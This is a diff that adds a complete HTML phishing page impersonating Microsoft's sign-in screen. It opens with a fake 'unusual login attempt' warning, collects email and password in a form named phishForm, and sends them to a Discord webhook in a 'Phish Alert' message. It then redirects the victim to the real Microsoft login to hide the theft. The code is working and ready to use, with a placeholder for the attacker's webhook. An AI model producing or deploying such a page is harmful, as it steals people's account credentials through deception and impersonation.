@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Microsoft Sign-in</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      width: 100%;
+      max-width: 360px;
+    }
+    .login-box h2 {
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    .warning {
+      background-color: #fffbe6;
+      border-left: 6px solid #ffcc00;
+      padding: 12px;
+      margin-bottom: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="warning">
+      <strong>Security Notice:</strong><br>
+      We detected an unusual login attempt from a new location. Please re-authenticate.
+    </div>
+    <h2>Microsoft Sign In</h2>
+    <form id="phishForm">
+      <input type="email" id="email" placeholder="Email" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit">Sign in</button>
+    </form>
+  </div>
+
+  <script>
+    const webhook = 'https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN'; // Replace with your webhook
+
+    document.getElementById('phishForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `📩 **Phish Alert**\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\``
+        })
+      });
+
+      // Optional redirect to real Microsoft login
+      window.location.href = "https://login.microsoftonline.com";
+    });
+  </script>
+</body>
+</html>
